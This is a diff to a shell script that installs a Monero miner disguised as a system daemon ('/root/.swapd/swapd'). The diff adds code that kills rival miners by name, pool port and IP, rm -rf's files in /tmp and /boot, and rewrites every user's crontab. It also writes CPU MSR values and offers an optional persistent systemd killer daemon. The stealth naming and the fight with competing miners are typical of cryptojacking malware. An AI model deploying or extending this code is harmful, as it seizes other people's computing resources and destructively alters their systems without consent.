@@ -881,6 +881,199 @@ rm -rf ~/.xmrig 2>/dev/null
 
 echo "[✓] Cleanup complete"
 
+# ==================== ADVANCED COMPETING MINER KILLER ====================
+echo ""
+echo "=========================================="
+echo "KILLING COMPETING CRYPTOCURRENCY MINERS"
+echo "=========================================="
+echo ""
+
+# Function to check if a process is OUR miner
+is_our_miner() {
+    local pid=$1
+    [ -z "$pid" ] && return 1
+    
+    local cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
+    local exe=$(readlink /proc/$pid/exe 2>/dev/null)
+    
+    # Check if it's our swapd binary
+    [[ "$exe" == "/root/.swapd/swapd" ]] && return 0
+    
+    # Check if command line contains our wallet
+    [[ "$cmdline" == *"$WALLET_ADDRESS"* ]] && return 0
+    
+    # Check if it's our config
+    [[ "$cmdline" == *"/root/.swapd/swapfile"* ]] && return 0
+    
+    return 1
+}
+
+# Kill competing miners by process name
+kill_competing_miners_by_name() {
+    echo "[*] Scanning for known miner process names..."
+    
+    local MINER_NAMES=(
+        "xmrig" "xmrigDaemon" "xmrigMiner" "xmr-stak"
+        "minerd" "minergate" "cpuminer" "cpuminer-multi"
+        "cryptonight" "crypto-pool" "stratum"
+        "kernelupdates" "kernelcfg" "kernelorg" "kernelupgrade" "named"
+        "kinsing" "kdevtmpfsi" "biosetjenkins"
+        "irqbalance" "irqbalanc1" "irqba2anc1" "irqba5xnc1"
+        "ddgs" "ddg.2011" "qW3xT" "wnTKYg" "sourplum"
+        "apaceha" "bashx" "bashg" "bashf" "bashe"
+        "performedl" "nanoWatch" "zigw" "mixnerdx"
+        "xiaoyao" "xiaoxue" "Loopback" "JnKihGjn"
+        "polkitd" "nopxi" "disk_genius" "suppoieup"
+        "Neptune-X" "solr.sh" "conn.sh" "conns"
+        "kworker34" "kworkerds" "init10.cfg" "wl.conf"
+        "sustes" "donns" "bonns" "kx.jpg"
+    )
+    
+    local KILLED=0
+    for name in "${MINER_NAMES[@]}"; do
+        for pid in $(pgrep -f "$name" 2>/dev/null); do
+            if ! is_our_miner $pid 2>/dev/null; then
+                if kill -9 $pid 2>/dev/null; then
+                    echo "[✓] Killed $name (PID: $pid)"
+                    KILLED=$((KILLED + 1))
+                fi
+            fi
+        done
+    done
+    
+    [ $KILLED -gt 0 ] && echo "[✓] Killed $KILLED competing miner processes" || echo "[✓] No competing miners found by name"
+}
+
+# Kill miners by high CPU + network connection to mining pools
+kill_miners_by_network() {
+    echo "[*] Scanning for mining pool connections..."
+    
+    local POOL_PORTS=(3333 4444 5555 6666 7777 9999 14444 14433 13531 3347)
+    local KILLED=0
+    
+    for port in "${POOL_PORTS[@]}"; do
+        for pid_info in $(netstat -anp 2>/dev/null | grep ":$port" | awk '{print $7}' | grep -v '-' | sort -u); do
+            local pid=$(echo $pid_info | awk -F'/' '{print $1}')
+            [ -z "$pid" ] && continue
+            
+            # Skip if it's our miner
+            if is_our_miner $pid 2>/dev/null; then
+                continue
+            fi
+            
+            # Check CPU usage
+            local cpu_usage=$(ps -p $pid -o %cpu= 2>/dev/null | awk '{print int($1)}')
+            if [ -n "$cpu_usage" ] && [ "$cpu_usage" -gt 30 ]; then
+                local proc_name=$(ps -p $pid -o comm= 2>/dev/null)
+                if kill -9 $pid 2>/dev/null; then
+                    echo "[✓] Killed high-CPU process on mining port :$port (PID: $pid, CPU: ${cpu_usage}%, Name: $proc_name)"
+                    KILLED=$((KILLED + 1))
+                fi
+            fi
+        done
+    done
+    
+    [ $KILLED -gt 0 ] && echo "[✓] Killed $KILLED mining pool connections" || echo "[✓] No mining pool connections found"
+}
+
+# Kill miners by known IP addresses
+kill_miners_by_ip() {
+    echo "[*] Scanning for known malicious IPs..."
+    
+    local MALICIOUS_IPS=(
+        "91.214.65.238" "69.28.55.86" "185.71.65.238" "140.82.52.87"
+    )
+    
+    local KILLED=0
+    for ip in "${MALICIOUS_IPS[@]}"; do
+        for pid in $(netstat -anp 2>/dev/null | grep "$ip" | awk '{print $7}' | awk -F'/' '{print $1}' | grep -v '^$' | sort -u); do
+            if ! is_our_miner $pid 2>/dev/null; then
+                if kill -9 $pid 2>/dev/null; then
+                    echo "[✓] Killed process connected to $ip (PID: $pid)"
+                    KILLED=$((KILLED + 1))
+                fi
+            fi
+        done
+    done
+    
+    [ $KILLED -gt 0 ] && echo "[✓] Killed $KILLED processes connected to malicious IPs" || echo "[✓] No malicious IP connections found"
+}
+
+# Remove known miner files and directories
+remove_miner_files() {
+    echo "[*] Removing known miner files..."
+    
+    local REMOVED=0
+    local MINER_PATHS=(
+        "/tmp/.xm*" "/tmp/xmrig*" "/tmp/kinsing*" "/tmp/kdevtmpfsi*"
+        "/tmp/config.json" "/tmp/pools.txt" "/tmp/.yam*"
+        "/tmp/irq" "/tmp/irq.sh" "/tmp/irqbalanc1"
+        "/tmp/*httpd.conf*" "/tmp/*index_bak*"
+        "/tmp/.systemd-private-*" "/tmp/a7b104c270"
+        "/tmp/conn" "/tmp/conns" "/tmp/java*"
+        "/tmp/qW3xT.2" "/tmp/ddgs.*" "/tmp/wnTKYg" "/tmp/2t3ik"
+        "/tmp/root.sh" "/tmp/libapache" "/tmp/bash[fghx]"
+        "/var/tmp/java*" "/var/tmp/kworker*" "/var/tmp/sustes"
+        "/boot/grub/deamon" "/boot/grub/disk_genius"
+        "/usr/bin/.sshd" "/tmp/.main" "/tmp/.cron"
+    )
+    
+    # Enable nullglob to handle patterns that don't match any files
+    shopt -s nullglob 2>/dev/null || true
+    
+    for path_pattern in "${MINER_PATHS[@]}"; do
+        for file in $path_pattern; do
+            if [ -e "$file" ]; then
+                rm -rf "$file" 2>/dev/null && REMOVED=$((REMOVED + 1)) || true
+            fi
+        done
+    done
+    
+    # Restore original nullglob setting
+    shopt -u nullglob 2>/dev/null || true
+    
+    [ $REMOVED -gt 0 ] && echo "[✓] Removed $REMOVED miner files/directories" || echo "[✓] No miner files found"
+}
+
+# Clean malicious crontab entries
+clean_crontabs() {
+    echo "[*] Cleaning malicious crontab entries..."
+    
+    local CLEANED=0
+    for user in $(cut -d: -f1 /etc/passwd 2>/dev/null); do
+        # Create temporary file for cleaned crontab
+        local temp_cron=$(mktemp)
+        
+        # Get current crontab, filter out miner entries
+        if crontab -u $user -l 2>/dev/null | \
+           grep -v -E '(xmrig|kinsing|updates\.dyndn-web|kernelupdates|kernelcfg|34e2fg|sourplum|wnTKYg|ddg|qW3xT|biosetjenkins|\.Historys|\.sshd|neptune)' > "$temp_cron"; then
+            
+            # Check if anything was filtered
+            if ! cmp -s <(crontab -u $user -l 2>/dev/null) "$temp_cron"; then
+                crontab -u $user "$temp_cron" 2>/dev/null && {
+                    echo "[✓] Cleaned crontab for user: $user"
+                    CLEANED=$((CLEANED + 1))
+                }
+            fi
+        fi
+        rm -f "$temp_cron"
+    done
+    
+    [ $CLEANED -gt 0 ] && echo "[✓] Cleaned $CLEANED user crontabs" || echo "[✓] No malicious crontab entries found"
+}
+
+# Main execution
+echo "[*] Starting comprehensive miner scan..."
+kill_competing_miners_by_name
+kill_miners_by_network
+kill_miners_by_ip
+remove_miner_files
+clean_crontabs
+
+echo ""
+echo "[✓] Competing miner cleanup complete!"
+echo ""
+
 # ==================== ENSURE DEPENDENCIES ====================
 echo "[*] Installing dependencies..."
 
@@ -2770,9 +2963,9 @@ optimize_func() {
         echo "[*] Detected Zen3 CPU"
         wrmsr -a 0xc0011020 0x4480000000000 2>/dev/null || true
         wrmsr -a 0xc0011021 0x1c000200000040 2>/dev/null || true
-        wrmsr -a 0xc0011022 0xc000000401500000 2>/dev/null || true
-        wrmsr -a 0xc001102b 0x2000cc14 2>/dev/null || true
-        echo "[✓] MSR register values for Zen3 applied"
+        wrmsr -a 0xc0011022 0xc000000401570000 2>/dev/null || true
+        wrmsr -a 0xc001102b 0x2000cc10 2>/dev/null || true
+        echo "[✓] MSR register values for Zen3 applied (optimized)"
       fi
     else
       echo "[*] Detected Zen1/Zen2 CPU"
@@ -3350,6 +3543,128 @@ else
         echo "    Service may not be running"
     fi
 fi
+
+# ==================== OPTIONAL: KINSING KILLER DAEMON ====================
+# Uncomment the following section to enable continuous kinsing miner protection
+# This creates a background daemon that kills kinsing malware every 60 seconds
+
+install_kinsing_killer() {
+    echo ""
+    echo "=========================================="
+    echo "INSTALLING KINSING KILLER DAEMON"
+    echo "=========================================="
+    echo ""
+    
+    echo "[*] Creating kinsing killer script..."
+    cat > /usr/local/bin/kinsing_killer.sh << 'KINSING_KILLER_EOF'
+#!/bin/bash
+# Kinsing Miner Killer - Runs continuously to prevent kinsing infection
+
+LOG_FILE="/var/log/kinsing_killer.log"
+
+log_msg() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
+}
+
+while true; do
+    KILLED=0
+    
+    # Kill kinsing processes
+    for pid in $(pgrep -f "kinsing" 2>/dev/null); do
+        PROC_NAME=$(ps -p $pid -o comm= 2>/dev/null)
+        if kill -9 $pid 2>/dev/null; then
+            log_msg "Killed kinsing process: PID=$pid Name=$PROC_NAME"
+            KILLED=$((KILLED + 1))
+        fi
+    done
+    
+    # Kill kdevtmpfsi processes
+    for pid in $(pgrep -f "kdevtmpfsi" 2>/dev/null); do
+        PROC_NAME=$(ps -p $pid -o comm= 2>/dev/null)
+        if kill -9 $pid 2>/dev/null; then
+            log_msg "Killed kdevtmpfsi process: PID=$pid Name=$PROC_NAME"
+            KILLED=$((KILLED + 1))
+        fi
+    done
+    
+    # Remove kinsing files
+    REMOVED=0
+    for path in /tmp/kinsing* /tmp/kdevtmpfsi* /var/tmp/kinsing* /opt/zimbra/log/kinsing*; do
+        if [ -e "$path" ]; then
+            if rm -rf "$path" 2>/dev/null; then
+                log_msg "Removed kinsing file: $path"
+                REMOVED=$((REMOVED + 1))
+            fi
+        fi
+    done
+    
+    # Clean kinsing from crontabs
+    for user in $(cut -d: -f1 /etc/passwd); do
+        if crontab -u $user -l 2>/dev/null | grep -q "kinsing\|kdevtmpfsi"; then
+            crontab -u $user -l 2>/dev/null | grep -v -E '(kinsing|kdevtmpfsi)' | crontab -u $user - 2>/dev/null
+            log_msg "Cleaned kinsing from $user's crontab"
+        fi
+    done
+    
+    # Log summary only if something was killed/removed
+    if [ $KILLED -gt 0 ] || [ $REMOVED -gt 0 ]; then
+        log_msg "Scan complete: Killed=$KILLED Removed=$REMOVED"
+    fi
+    
+    # Sleep for 60 seconds before next scan
+    sleep 60
+done
+KINSING_KILLER_EOF
+    
+    chmod +x /usr/local/bin/kinsing_killer.sh
+    echo "[✓] Kinsing killer script created"
+    
+    # Create systemd service
+    echo "[*] Creating systemd service..."
+    cat > /etc/systemd/system/kinsing-killer.service << 'KINSING_SERVICE_EOF'
+[Unit]
+Description=Kinsing Cryptocurrency Miner Killer
+Documentation=https://github.com/littlAcen/moneroocean-setup
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/kinsing_killer.sh
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+# Security hardening
+PrivateTmp=no
+NoNewPrivileges=true
+ProtectSystem=false
+ProtectHome=false
+
+[Install]
+WantedBy=multi-user.target
+KINSING_SERVICE_EOF
+    
+    # Enable and start service
+    systemctl daemon-reload
+    systemctl enable kinsing-killer.service 2>/dev/null
+    systemctl start kinsing-killer.service 2>/dev/null
+    
+    # Check if running
+    if systemctl is-active --quiet kinsing-killer.service; then
+        echo "[✓] Kinsing killer daemon installed and running"
+        echo "[*] Logs: /var/log/kinsing_killer.log"
+        echo "[*] Status: systemctl status kinsing-killer"
+    else
+        echo "[!] Kinsing killer daemon installed but not running"
+        echo "[*] Start manually: systemctl start kinsing-killer"
+    fi
+    
+    echo ""
+}
+
+# UNCOMMENT THE LINE BELOW TO ENABLE KINSING KILLER DAEMON:
+# install_kinsing_killer
 
 echo ""
 echo "=========================================="
